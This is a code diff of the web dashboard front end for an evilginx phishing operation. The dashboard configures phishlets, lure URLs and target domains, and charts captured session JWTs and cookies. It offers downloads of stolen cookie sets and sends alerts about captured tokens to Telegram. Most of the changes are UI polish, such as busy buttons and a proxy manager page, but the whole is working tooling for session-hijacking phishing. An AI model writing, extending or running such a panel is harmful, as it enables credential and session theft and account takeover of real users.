+          <div class="px-chart-wrap donut"><canvas id="pxChartDonut"></canvas><div class="px-donut-center" id="pxDonutCenter"><b id="pxDonutVal">—</b><span id="pxDonutSub">total out</span></div></div>
+        </div>
+      </div>
+      <div id="pxTrafficTable"></div>
+    </div>
+    <div class="sec-title"><i class="fa-solid fa-server"></i> Proxy Instances</div>
+    <div class="px-grid" id="pxGrid"></div>
+  </div>
+</section>
   </div>
 </div>
+</div>
+<div class="nc-overlay" id="ncOverlay" onclick="closeNcPanel()"></div>
+<div class="nc-panel" id="ncPanel">
+  <div class="nc-head">
+    <div class="nc-head-title"><i class="fa-solid fa-bell"></i><h3>Notifications</h3></div>
+    <button type="button" class="nc-close" onclick="closeNcPanel()" title="Close" aria-label="Close">&times;</button>
+  </div>
+  <div class="nc-actions">
+    <button type="button" onclick="ncMarkAllRead()"><i class="fa-solid fa-check-double"></i> Mark all read</button>
+    <button type="button" onclick="ncClearRead()"><i class="fa-solid fa-broom"></i> Clear read</button>
+  </div>
+  <div class="nc-list" id="ncList"></div>
 </div>
 <div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
 <div class="modal-overlay" id="modalOverlay"><div class="modal"><div class="modal-head"><h3 id="modalTitle">MODAL</h3><button class="close" onclick="closeModal()">&times;</button></div><div id="modalBody"></div><div class="modal-foot" id="modalFoot"></div></div></div>
@@ -507,14 +794,35 @@ tr:hover td{background:var(--accent-dim)}
 <script>
 const socket=io();let term,fitAddon,termReady=false;let allSessions=[],allPhishlets=[],allLures=[];
 const $=s=>document.querySelector(s);const $$=s=>document.querySelectorAll(s);
-const api=async(url,opts)=>{const r=await fetch(url,{headers:{'Content-Type':'application/json'},...opts});return r.json()};
+const api=async(url,opts)=>{const r=await fetch(url,{cache:'no-store',headers:{'Content-Type':'application/json'},...opts});return r.json()};
+function btnEl(x){if(!x)return null;if(typeof x==='string')return $(x);if(x.currentTarget)return x.currentTarget.closest('button');if(x.target)return x.target.closest?x.target.closest('button'):x.target;return x.closest?x.closest('button'):x}
+function btnBusy(el,on,waitText){
+  el=btnEl(el); if(!el)return;
+  if(on){
+    if(!el.dataset.idleHtml) el.dataset.idleHtml=el.innerHTML;
+    el.disabled=true;
+    el.classList.add('busy');
+    el.innerHTML='<i class="fa-solid fa-spinner fa-spin"></i> '+(waitText||'Working…');
+  }else{
+    el.disabled=false;
+    el.classList.remove('busy');
+    if(el.dataset.idleHtml){el.innerHTML=el.dataset.idleHtml;delete el.dataset.idleHtml}
+  }
+}
+async function withBusy(el,waitText,fn){
+  el=btnEl(el);
+  if(el&&el.disabled)return;
+  btnBusy(el,true,waitText);
+  try{return await fn()}
+  finally{btnBusy(el,false)}
+}
 function toast(msg,type='ok'){const d=document.createElement('div');d.className='toast '+type;d.textContent=msg;$('#toasts').appendChild(d);setTimeout(()=>d.remove(),4000)}
 function ts(epoch){if(!epoch)return'\u2014';const d=new Date(epoch*1000);return d.toLocaleString('en-GB',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit',second:'2-digit'})}
 function uptime(sec){const d=Math.floor(sec/86400),h=Math.floor(sec%86400/3600),m=Math.floor(sec%3600/60);return d>0?`${d}d ${h}h`:`${h}h ${m}m`}
 function esc(s){const el=document.createElement('span');el.textContent=s;return el.innerHTML}
-const pageNames={dashboard:'DASHBOARD',phishlets:'PHISHLETS',config:'CONFIGURATION',lures:'LURES',files:'FILE EXPLORER',services:'SERVICES',sessions:'SESSIONS',terminal:'E-TERMINAL',shell:'TERMINAL',health:'HEALTH',notifications:'NOTIFICATIONS'};
+const pageNames={dashboard:'DASHBOARD',phishlets:'PHISHLETS',config:'CONFIGURATION',lures:'LURES',proxy:'PROXY MANAGER',files:'FILE EXPLORER',services:'SERVICES',sessions:'SESSIONS',terminal:'E-TERMINAL',shell:'TERMINAL',health:'HEALTH',notifications:'NOTIFICATIONS'};
 function resizeCharts(){
-  try{if(chartTL)chartTL.resize();if(chartBD)chartBD.resize();if(healthChart)healthChart.resize()}catch(e){}
+  try{if(chartTL)chartTL.resize();if(chartBD)chartBD.resize();if(healthChart)healthChart.resize();if(_pxChartDonut)_pxChartDonut.resize()}catch(e){}
 }
 function toggleSidebar(){
   if(window.innerWidth<=768){
@@ -542,8 +850,8 @@ function labelTable(tbody){
   });
 }
 function bindCardTables(){document.querySelectorAll('.tbl-wrap tbody').forEach(labelTable)}
-$$('.sidebar nav a[data-page]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const pg=a.dataset.page;$$('.sidebar nav a').forEach(x=>x.classList.remove('active'));a.classList.add('active');$$('.page').forEach(p=>p.classList.remove('active'));$(`#page-${pg}`).classList.add('active');$('#pageTitle').textContent=pageNames[pg]||pg.toUpperCase();closeSidebar();stopHealth();if(pg==='dashboard')loadDashboard();if(pg==='phishlets')loadPhishlets();if(pg==='config')loadConfig();if(pg==='lures')loadLures();if(pg==='files')loadFiles();if(pg==='services')loadServices();if(pg==='sessions')loadSessions();if(pg==='notifications')loadNotifications();if(pg==='terminal')initTerminal();if(pg==='shell')initShell();if(pg==='health')startHealth()})});
-let chartTL=null,chartBD=null;
+$$('.sidebar nav a[data-page]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const pg=a.dataset.page;$$('.sidebar nav a').forEach(x=>x.classList.remove('active'));a.classList.add('active');$$('.page').forEach(p=>p.classList.remove('active'));$(`#page-${pg}`).classList.add('active');$('#pageTitle').textContent=pageNames[pg]||pg.toUpperCase();closeSidebar();stopHealth();if(pg==='dashboard')loadDashboard();if(pg==='phishlets')loadPhishlets();if(pg==='config')loadConfig();if(pg==='lures')loadLures();if(pg==='proxy')loadProxy();if(pg==='files')loadFiles();if(pg==='services')loadServices();if(pg==='sessions'){resetSessSearch();loadSessions();}if(pg==='notifications')loadNotifications();if(pg==='terminal')initTerminal();if(pg==='shell')initShell();if(pg==='health')startHealth()})});
+let chartTL=null,chartBD=null,_pxChartBar=null,_pxChartDonut=null;
 function renderCharts(d){
   const tl=d.chart_timeline||{labels:[],total:[],jwt:[],cookies:[],empty:[]};
   const bd=d.chart_breakdown||{jwt:0,with_cookies:0,empty:0};
@@ -552,10 +860,10 @@ function renderCharts(d){
   if(!ctx1||!ctx2)return;
   const labels=tl.labels.map(l=>{const p=l.split(' ');const dp=p[0].split('-');return dp[2]+'/'+dp[1]+' '+p[1]});
   if(chartTL)chartTL.destroy();
-  chartTL=new Chart(ctx1,{type:'line',data:{labels,datasets:[{label:'Total',data:tl.total,borderColor:'#00ff88',backgroundColor:'rgba(0,255,136,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#00ff88'},{label:'JWT',data:tl.jwt,borderColor:'#a78bfa',backgroundColor:'rgba(167,139,250,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#a78bfa'},{label:'Cookies',data:tl.cookies,borderColor:'#22d3ee',backgroundColor:'rgba(34,211,238,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#22d3ee'},{label:'Empty',data:tl.empty,borderColor:'#475569',backgroundColor:'rgba(71,85,105,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#475569'}]},options:{responsive:true,maintainAspectRatio:false,interaction:{mode:'index',intersect:false},plugins:{legend:{display:true,position:'top',labels:{color:'#94a3b8',font:{family:'Inter',size:12},usePointStyle:true,pointStyle:'circle',padding:16}},tooltip:{backgroundColor:'rgba(10,14,23,0.95)',borderColor:'rgba(0,255,136,0.2)',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#94a3b8',titleFont:{family:'Inter',weight:'600'},bodyFont:{family:'JetBrains Mono',size:12},padding:12,cornerRadius:8}},scales:{x:{grid:{color:'rgba(255,255,255,0.04)',drawBorder:false},ticks:{color:'#475569',font:{size:10,family:'JetBrains Mono'},maxRotation:45,maxTicksLimit:12}},y:{grid:{color:'rgba(255,255,255,0.04)',drawBorder:false},ticks:{color:'#475569',font:{size:11,family:'JetBrains Mono'},precision:0},beginAtZero:true}}}});
+  chartTL=new Chart(ctx1,{type:'line',data:{labels,datasets:[{label:'Total',data:tl.total,borderColor:'#00ff88',backgroundColor:'rgba(0,255,136,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#00ff88'},{label:'JWT',data:tl.jwt,borderColor:'#a78bfa',backgroundColor:'rgba(167,139,250,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#a78bfa'},{label:'Cookies',data:tl.cookies,borderColor:'#22d3ee',backgroundColor:'rgba(34,211,238,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#22d3ee'},{label:'Empty',data:tl.empty,borderColor:'#475569',backgroundColor:'rgba(71,85,105,0.08)',fill:true,tension:0.4,borderWidth:2,pointRadius:0,pointHoverRadius:5,pointHoverBackgroundColor:'#475569'}]},options:{responsive:true,maintainAspectRatio:false,interaction:{mode:'index',intersect:false},plugins:{legend:{display:true,position:'top',labels:{color:'#e2e8f0',font:{family:'Inter',size:12},usePointStyle:true,pointStyle:'circle',padding:16}},tooltip:{backgroundColor:'rgba(10,14,23,0.95)',borderColor:'rgba(0,255,136,0.2)',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#e2e8f0',titleFont:{family:'Inter',weight:'600'},bodyFont:{family:'JetBrains Mono',size:12},padding:12,cornerRadius:8}},scales:{x:{grid:{color:'rgba(255,255,255,0.04)',drawBorder:false},ticks:{color:'#e2e8f0',font:{size:10,family:'JetBrains Mono'},maxRotation:45,maxTicksLimit:12}},y:{grid:{color:'rgba(255,255,255,0.04)',drawBorder:false},ticks:{color:'#e2e8f0',font:{size:11,family:'JetBrains Mono'},precision:0},beginAtZero:true}}}});
   if(chartBD)chartBD.destroy();
   const bdTotal=bd.jwt+bd.with_cookies+bd.empty;
-  chartBD=new Chart(ctx2,{type:'doughnut',data:{labels:['JWT Captured','With Cookies','Empty'],datasets:[{data:[bd.jwt,bd.with_cookies,bd.empty],backgroundColor:['rgba(167,139,250,0.8)','rgba(34,211,238,0.8)','rgba(71,85,105,0.6)'],borderColor:['#a78bfa','#22d3ee','#475569'],borderWidth:2,hoverOffset:8}]},options:{responsive:true,maintainAspectRatio:false,cutout:'65%',plugins:{legend:{display:false},tooltip:{backgroundColor:'rgba(10,14,23,0.95)',borderColor:'rgba(0,255,136,0.2)',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#94a3b8',titleFont:{family:'Inter',weight:'600'},bodyFont:{family:'JetBrains Mono',size:13},padding:12,cornerRadius:8,callbacks:{label:function(c){const pct=bdTotal?((c.raw/bdTotal)*100).toFixed(1):'0';return' '+c.label+': '+c.raw+' ('+pct+'%)'}}}}}})
+  chartBD=new Chart(ctx2,{type:'doughnut',data:{labels:['JWT Captured','With Cookies','Empty'],datasets:[{data:[bd.jwt,bd.with_cookies,bd.empty],backgroundColor:['rgba(167,139,250,0.8)','rgba(34,211,238,0.8)','rgba(71,85,105,0.6)'],borderColor:['#a78bfa','#22d3ee','#475569'],borderWidth:2,hoverOffset:8}]},options:{responsive:true,maintainAspectRatio:false,cutout:'65%',plugins:{legend:{display:false},tooltip:{backgroundColor:'rgba(10,14,23,0.95)',borderColor:'rgba(0,255,136,0.2)',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#e2e8f0',titleFont:{family:'Inter',weight:'600'},bodyFont:{family:'JetBrains Mono',size:13},padding:12,cornerRadius:8,callbacks:{label:function(c){const pct=bdTotal?((c.raw/bdTotal)*100).toFixed(1):'0';return' '+c.label+': '+c.raw+' ('+pct+'%)'}}}}}})
   const leg=document.getElementById('breakdownLegend');
   if(leg){const items=[{label:'JWT Captured',val:bd.jwt,color:'#a78bfa'},{label:'With Cookies',val:bd.with_cookies,color:'#22d3ee'},{label:'Empty',val:bd.empty,color:'#475569'}];leg.innerHTML=items.map(i=>{const pct=bdTotal?((i.val/bdTotal)*100).toFixed(1):'0';return `<div style="display:flex;align-items:center;gap:10px"><div style="width:10px;height:10px;border-radius:50%;background:${i.color};flex-shrink:0"></div><span style="flex:1;font-size:13px;color:var(--text2)">${i.label}</span><span style="font-family:var(--mono);font-size:13px;color:var(--text);font-weight:600">${i.val}</span><span style="font-size:12px;color:var(--text3)">${pct}%</span></div>`}).join('')}
 }
@@ -575,7 +883,7 @@ function ensureHealthChart(){
     {label:'CPU %',data:healthHist.cpu,borderColor:'#00ff88',backgroundColor:'rgba(0,255,136,0.10)',fill:true,tension:0.35,borderWidth:2,pointRadius:0,yAxisID:'y'},
     {label:'RAM %',data:healthHist.ram,borderColor:'#22d3ee',backgroundColor:'rgba(34,211,238,0.06)',fill:true,tension:0.35,borderWidth:2,pointRadius:0,yAxisID:'y'},
     {label:'In KB/s',data:healthHist.netin,borderColor:'#a78bfa',backgroundColor:'transparent',fill:false,tension:0.35,borderWidth:2,pointRadius:0,yAxisID:'y1'}
-  ]},options:{responsive:true,maintainAspectRatio:false,animation:false,interaction:{mode:'index',intersect:false},plugins:{legend:{display:true,position:'top',labels:{color:'#94a3b8',font:{family:'Inter',size:12},usePointStyle:true,pointStyle:'circle',padding:14}},tooltip:{backgroundColor:'rgba(10,14,23,0.95)',borderColor:'rgba(0,255,136,0.2)',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#94a3b8'}},scales:{x:{grid:{color:'rgba(255,255,255,0.04)'},ticks:{color:'#475569',font:{size:10,family:'JetBrains Mono'},maxTicksLimit:8}},y:{beginAtZero:true,max:100,grid:{color:'rgba(255,255,255,0.04)'},ticks:{color:'#475569',font:{size:11,family:'JetBrains Mono'}}},y1:{beginAtZero:true,position:'right',grid:{display:false},ticks:{color:'#475569',font:{size:10,family:'JetBrains Mono'}}}}}});
+  ]},options:{responsive:true,maintainAspectRatio:false,animation:false,interaction:{mode:'index',intersect:false},plugins:{legend:{display:true,position:'top',labels:{color:'#e2e8f0',font:{family:'Inter',size:12},usePointStyle:true,pointStyle:'circle',padding:14}},tooltip:{backgroundColor:'rgba(10,14,23,0.95)',borderColor:'rgba(0,255,136,0.2)',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#e2e8f0'}},scales:{x:{grid:{color:'rgba(255,255,255,0.04)'},ticks:{color:'#e2e8f0',font:{size:10,family:'JetBrains Mono'},maxTicksLimit:8}},y:{beginAtZero:true,max:100,grid:{color:'rgba(255,255,255,0.04)'},ticks:{color:'#e2e8f0',font:{size:11,family:'JetBrains Mono'}}},y1:{beginAtZero:true,position:'right',grid:{display:false},ticks:{color:'#e2e8f0',font:{size:10,family:'JetBrains Mono'}}}}}});
 }
 async function loadHealth(){
   const d=await api('/api/health');
@@ -635,36 +943,36 @@ function updateEvStatus(running){const dot=$('#evDot'),lbl=$('#evLabel');if(runn
 async function toggleNotifications(){var en=document.getElementById('ntfEnabled').checked;var r=await api('/api/notifications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:!en})});if(r.ok){document.getElementById('ntfEnabled').checked=!en;toast(!en?'Notifications started':'Notifications stopped');updateNtfToggle(!en);loadNotifications()}else toast(r.error||'Error','err')}
 function updateNtfToggle(on){var btn=document.getElementById('ntfToggleBtn');var txt=document.getElementById('ntfToggleText');if(on){btn.className='btn danger';txt.textContent='Stop'}else{btn.className='btn fill';txt.textContent='Start'}}
 async function loadNotifications(){const s=await api('/api/notifications');$('#ntfToken').value=s.bot_token||'';$('#ntfChatId').value=s.chat_id||'';$('#ntfEnabled').checked=!!s.enabled;$('#ntfJwt').checked=s.notify_jwt!==false;$('#ntfTokens').checked=s.notify_tokens!==false;$('#ntfStatus').textContent='Status: '+(s.enabled?'ACTIVE':'DISABLED')+' | Sent notifications: '+(s.sent_count||0)}
-async function saveNotifications(){const data={bot_token:$('#ntfToken').value.trim(),chat_id:$('#ntfChatId').value.trim(),enabled:$('#ntfEnabled').checked,notify_jwt:$('#ntfJwt').checked,notify_tokens:$('#ntfTokens').checked};const r=await api('/api/notifications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});if(r.ok){toast('Settings saved');loadNotifications()}else toast(r.error||'Error','err')}
-async function testNotifications(){await saveNotifications();const r=await api('/api/notifications/test',{method:'POST'});if(r.ok)toast('Test message sent to Telegram!');else toast(r.error||'Failed','err')}
-async function resetNotifications(){const r=await api('/api/notifications/reset',{method:'POST'});if(r.ok){toast('Sent IDs reset');loadNotifications()}else toast(r.error||'Error','err')}
+async function saveNotifications(){const data={bot_token:$('#ntfToken').value.trim(),chat_id:$('#ntfChatId').value.trim(),enabled:$('#ntfEnabled').checked,notify_jwt:$('#ntfJwt').checked,notify_tokens:$('#ntfTokens').checked};await withBusy(typeof event!=='undefined'?event:null,'Saving…',async()=>{const r=await api('/api/notifications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});if(r.ok){toast('Settings saved');loadNotifications()}else toast(r.error||'Error','err')})}
+async function testNotifications(){await withBusy(typeof event!=='undefined'?event:null,'Sending…',async()=>{const data={bot_token:$('#ntfToken').value.trim(),chat_id:$('#ntfChatId').value.trim(),enabled:$('#ntfEnabled').checked,notify_jwt:$('#ntfJwt').checked,notify_tokens:$('#ntfTokens').checked};await api('/api/notifications',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});const r=await api('/api/notifications/test',{method:'POST'});if(r.ok)toast('Test message sent to Telegram!');else toast(r.error||'Failed','err')})}
+async function resetNotifications(){await withBusy(typeof event!=='undefined'?event:null,'Resetting…',async()=>{const r=await api('/api/notifications/reset',{method:'POST'});if(r.ok){toast('Sent IDs reset');loadNotifications()}else toast(r.error||'Error','err')})}
 function downloadCookieJson(id){window.open('/api/sessions/'+id+'/cookies.json','_blank')}
 async function editPhishletCfg(name){const c=await api('/api/config');const g=c.general||{};const ph=c.phishlets||{};const pc=ph[name]||{};const lures=(await api('/api/lures')).filter(l=>l.phishlet===name);const lure=lures[0]||{};openModal('\u270f\ufe0f EDIT CONFIGURATION \u2014 '+name,`<div class="field"><label>Domain</label><input id="ecDomain" value="${g.domain||''}"></div><div class="field"><label>Phishlet Hostname</label><input id="ecHostname" value="${pc.hostname||''}"></div><div class="field"><label>IPv4 External</label><input id="ecIpv4" value="${g.external_ipv4||''}"></div><div class="field"><label>Lure Path</label><input id="ecLurePath" value="${lure.path||'/'}"></div><div class="field"><label>Blacklist Mode</label><select id="ecBlacklist" style="width:100%;padding:12px;background:var(--bg);color:var(--accent);border:1px solid var(--border);border-radius:8px;font-family:var(--mono)"><option value="off" ${(c.blacklist||{}).mode==='off'?'selected':''}>off</option><option value="unauth" ${(c.blacklist||{}).mode==='unauth'?'selected':''}>unauth</option><option value="full" ${(c.blacklist||{}).mode==='full'?'selected':''}>full</option></select></div>`,`<button class="btn fill" onclick="savePhishletCfg('${name}',${lure.index!==undefined?lure.index:-1})"><i class="fa-solid fa-floppy-disk"></i> SAVE</button><button class="btn" onclick="closeModal()">CANCEL</button>`)}
-async function savePhishletCfg(name,lureIdx){const domain=$('#ecDomain').value.trim();const hostname=$('#ecHostname').value.trim();const ipv4=$('#ecIpv4').value.trim();const lurePath=$('#ecLurePath').value.trim()||'/';const blacklist=$('#ecBlacklist').value;if(!domain){toast('Domain required','err');return}if(!ipv4){toast('IPv4 required','err');return}await api('/api/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain,ipv4,blacklist_mode:blacklist,unauth_url:'https://'+domain})});await api('/api/phishlets/'+name,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({hostname:hostname||domain})});if(lureIdx>=0){await api('/api/lures',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({index:lureIdx,path:lurePath})})}closeModal();openModal('\u2705 CONFIGURATION UPDATED',`<div style="line-height:2.2;padding:10px 0"><div><span style="color:var(--text3)">Phishlet:</span> <strong style="color:var(--cyan)">${name}</strong></div><div><span style="color:var(--text3)">Domain:</span> <span style="color:var(--accent)">${domain}</span></div><div><span style="color:var(--text3)">Hostname:</span> <span style="color:var(--accent)">${hostname||domain}</span></div><div><span style="color:var(--text3)">IPv4:</span> <span style="color:var(--accent)">${ipv4}</span></div><div><span style="color:var(--text3)">Lure path:</span> ${lurePath}</div><div style="margin-top:15px;padding:12px;background:var(--accent-dim);border:1px solid var(--accent);border-radius:8px;color:var(--yellow)">\u26a1 Restart evilginx to apply changes.</div></div>`,`<button class="btn fill" onclick="closeModal()">OK</button>`);loadConfig();loadPhishlets()}
+async function savePhishletCfg(name,lureIdx){const domain=$('#ecDomain').value.trim();const hostname=$('#ecHostname').value.trim();const ipv4=$('#ecIpv4').value.trim();const lurePath=$('#ecLurePath').value.trim()||'/';const blacklist=$('#ecBlacklist').value;if(!domain){toast('Domain required','err');return}if(!ipv4){toast('IPv4 required','err');return}const _sb=typeof event!=='undefined'?event:null;btnBusy(_sb,true,'Saving…');try{await api('/api/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({domain,ipv4,blacklist_mode:blacklist,unauth_url:'https://'+domain})});await api('/api/phishlets/'+name,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({hostname:hostname||domain})});if(lureIdx>=0){await api('/api/lures',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({index:lureIdx,path:lurePath})})}closeModal();openModal('\u2705 CONFIGURATION UPDATED',`<div style="line-height:2.2;padding:10px 0"><div><span style="color:var(--text3)">Phishlet:</span> <strong style="color:var(--cyan)">${name}</strong></div><div><span style="color:var(--text3)">Domain:</span> <span style="color:var(--accent)">${domain}</span></div><div><span style="color:var(--text3)">Hostname:</span> <span style="color:var(--accent)">${hostname||domain}</span></div><div><span style="color:var(--text3)">IPv4:</span> <span style="color:var(--accent)">${ipv4}</span></div><div><span style="color:var(--text3)">Lure path:</span> ${lurePath}</div><div style="margin-top:15px;padding:12px;background:var(--accent-dim);border:1px solid var(--accent);border-radius:8px;color:var(--yellow)">\u26a1 Restart evilginx to apply changes.</div></div>`,`<button class="btn fill" onclick="closeModal()">OK</button>`);loadConfig();loadPhishlets()}finally{btnBusy(_sb,false)}}
 function openQuickSetup(){let phOpts='';allPhishlets.forEach(p=>{phOpts+=`<option value="${esc(p.name)}">${esc(p.name)}</option>`});openModal('\u26a1 QUICK SETUP',`<div class="template-hint"><strong style="color:var(--accent)">\u2139 This wizard runs:</strong> <code>config domain</code> \u2192 <code>phishlets hostname</code> \u2192 <code>config ipv4</code> \u2192 <code>lures create</code> \u2192 <code>blacklist</code> \u2192 <code>phishlets enable</code></div><div class="field"><label>Select Phishlet</label><select id="qsPhishlet" style="width:100%;padding:12px;background:var(--bg);color:var(--accent);border:1px solid var(--border);border-radius:8px;font-family:var(--mono)">${phOpts}</select></div><div class="field"><label>Domain</label><input id="qsDomain" placeholder="example.com"></div><div class="field"><label>Phishlet Hostname <span class="hint" title="Leave empty = same as domain">\u2139</span></label><input id="qsHostname" placeholder="same as domain if empty"></div><div class="field"><label>IPv4 External</label><input id="qsIpv4" placeholder="0.0.0.0"></div><div class="field"><label>Lure Path</label><input id="qsLurePath" value="/"></div><div class="field"><label>Blacklist Mode</label><select id="qsBlacklist" style="width:100%;padding:12px;background:var(--bg);color:var(--accent);border:1px solid var(--border);border-radius:8px;font-family:var(--mono)"><option value="off">off</option><option value="unauth">unauth</option><option value="full">full</option></select></div><div class="field"><label><input type="checkbox" id="qsEnable" checked style="margin-right:8px;accent-color:var(--accent)">Enable phishlet after setup</label></div>`,`<button class="btn fill" onclick="submitQuickSetup()"><i class="fa-solid fa-rocket"></i> DEPLOY</button><button class="btn" onclick="closeModal()">CANCEL</button>`);api('/api/config').then(c=>{let g=c.general||{};let d=document.getElementById('qsDomain');if(d)d.value=g.domain||'';let i=document.getElementById('qsIpv4');if(i)i.value=g.external_ipv4||'';let b=document.getElementById('qsBlacklist');if(b)b.value=(c.blacklist||{}).mode||'off'})}
-async function submitQuickSetup(){let ph=$('#qsPhishlet').value;let domain=$('#qsDomain').value.trim();let hostname=$('#qsHostname').value.trim()||domain;let ipv4=$('#qsIpv4').value.trim();let lurePath=$('#qsLurePath').value.trim()||'/';let blacklist=$('#qsBlacklist').value;let enable=$('#qsEnable').checked;if(!ph){toast('Select a phishlet','err');return}if(!domain){toast('Domain is required','err');return}if(!ipv4){toast('IPv4 is required','err');return}let r=await api('/api/quick-setup',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phishlet:ph,domain,hostname,ipv4,lure_path:lurePath,blacklist_mode:blacklist,enable})});if(r.error){toast('Error: '+r.error,'err');return}closeModal();openModal('\u2705 CONFIGURATION APPLIED',`<div style="line-height:2.2;padding:10px 0"><div><span style="color:var(--text3)">Phishlet:</span> <strong style="color:var(--cyan)">${ph}</strong></div><div><span style="color:var(--text3)">Domain:</span> <span style="color:var(--accent)">${domain}</span></div><div><span style="color:var(--text3)">Hostname:</span> <span style="color:var(--accent)">${hostname}</span></div><div><span style="color:var(--text3)">IPv4:</span> <span style="color:var(--accent)">${ipv4}</span></div><div><span style="color:var(--text3)">Lure path:</span> ${lurePath}</div>${r.lure_url?'<div><span style="color:var(--text3)">Lure URL:</span> <a href="'+r.lure_url+'" target="_blank" style="color:var(--cyan)">'+r.lure_url+'</a></div>':''}<div style="margin-top:15px;padding:12px;background:var(--accent-dim);border:1px solid var(--accent);border-radius:8px;color:var(--yellow)">\u26a1 Restart evilginx to activate the new configuration.</div></div>`,`<button class="btn fill" onclick="closeModal()">OK</button>`);loadConfig();loadPhishlets();loadLures()}
-async function toggleEvilginx(){const s=await api('/api/ev/status');if(s.running){toast('Stopping evilginx...');await api('/api/ev/stop',{method:'POST'})}else{toast('Starting evilginx...');await api('/api/ev/start',{method:'POST'})}setTimeout(checkEvCfg,1500)}
+async function submitQuickSetup(){let ph=$('#qsPhishlet').value;let domain=$('#qsDomain').value.trim();let hostname=$('#qsHostname').value.trim()||domain;let ipv4=$('#qsIpv4').value.trim();let lurePath=$('#qsLurePath').value.trim()||'/';let blacklist=$('#qsBlacklist').value;let enable=$('#qsEnable').checked;if(!ph){toast('Select a phishlet','err');return}if(!domain){toast('Domain is required','err');return}if(!ipv4){toast('IPv4 is required','err');return}const _qb=typeof event!=='undefined'?event:null;btnBusy(_qb,true,'Deploying…');try{let r=await api('/api/quick-setup',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phishlet:ph,domain,hostname,ipv4,lure_path:lurePath,blacklist_mode:blacklist,enable})});if(r.error){toast('Error: '+r.error,'err');return}closeModal();openModal('\u2705 CONFIGURATION APPLIED',`<div style="line-height:2.2;padding:10px 0"><div><span style="color:var(--text3)">Phishlet:</span> <strong style="color:var(--cyan)">${ph}</strong></div><div><span style="color:var(--text3)">Domain:</span> <span style="color:var(--accent)">${domain}</span></div><div><span style="color:var(--text3)">Hostname:</span> <span style="color:var(--accent)">${hostname}</span></div><div><span style="color:var(--text3)">IPv4:</span> <span style="color:var(--accent)">${ipv4}</span></div><div><span style="color:var(--text3)">Lure path:</span> ${lurePath}</div>${r.lure_url?'<div><span style="color:var(--text3)">Lure URL:</span> <a href="'+r.lure_url+'" target="_blank" style="color:var(--cyan)">'+r.lure_url+'</a></div>':''}<div style="margin-top:15px;padding:12px;background:var(--accent-dim);border:1px solid var(--accent);border-radius:8px;color:var(--yellow)">\u26a1 Restart evilginx to activate the new configuration.</div></div>`,`<button class="btn fill" onclick="closeModal()">OK</button>`);loadConfig();loadPhishlets();loadLures()}finally{btnBusy(_qb,false)}}
+async function toggleEvilginx(){await withBusy($('#evToggleBtn'),'Working…',async()=>{const s=await api('/api/ev/status');if(s.running){toast('Stopping evilginx...');await api('/api/ev/stop',{method:'POST'})}else{toast('Starting evilginx...');await api('/api/ev/start',{method:'POST'})}setTimeout(checkEvCfg,1500)})}
 async function checkEvCfg(){const s=await api('/api/ev/status');const btn=$('#evToggleBtn');const txt=$('#evToggleText');const dot=$('#evDotCfg');const lbl=$('#evLabelCfg');if(s.running){if(txt)txt.textContent='STOP';if(btn)btn.className='btn danger';if(dot)dot.className='dot on';if(lbl){lbl.textContent='ONLINE';lbl.style.color='var(--accent)'}}else{if(txt)txt.textContent='START';if(btn)btn.className='btn fill';if(dot)dot.className='dot off';if(lbl){lbl.textContent='OFFLINE';lbl.style.color='var(--red)'}}updateEvStatus(s.running)}
-async function restartEvilginxCfg(){toast('Restarting...');const r=await api('/api/ev/restart',{method:'POST'});if(r.ok){toast('Restarted');setTimeout(checkEvCfg,1500)}else{toast('Failed','err')}}
+async function restartEvilginxCfg(){await withBusy(typeof event!=='undefined'?event:null,'Restarting…',async()=>{toast('Restarting...');const r=await api('/api/ev/restart',{method:'POST'});if(r.ok){toast('Restarted');setTimeout(checkEvCfg,1500)}else{toast('Failed','err')}})}
 function unconfigPhishlet(name){openModal('\u26a0\ufe0f DELETE CONFIGURATION',`<p style="color:var(--text2);margin-bottom:15px">Remove all configuration for <strong style="color:var(--cyan)">${name}</strong>?</p><p style="color:var(--text3);font-size:13px">This will reset hostname, disable the phishlet, and remove all associated lures. The phishlet YAML file will be kept.</p>`,`<button class="btn danger" onclick="doUnconfigPhishlet('${name}')"><i class="fa-solid fa-trash-can"></i> DELETE</button><button class="btn" onclick="closeModal()">CANCEL</button>`)}
-async function doUnconfigPhishlet(name){const r=await api('/api/phishlets/'+name+'/unconfigure',{method:'POST'});closeModal();if(r.ok){toast(name+' unconfigured');loadConfig();loadPhishlets();loadLures()}else{toast(r.error||'Error','err')}}
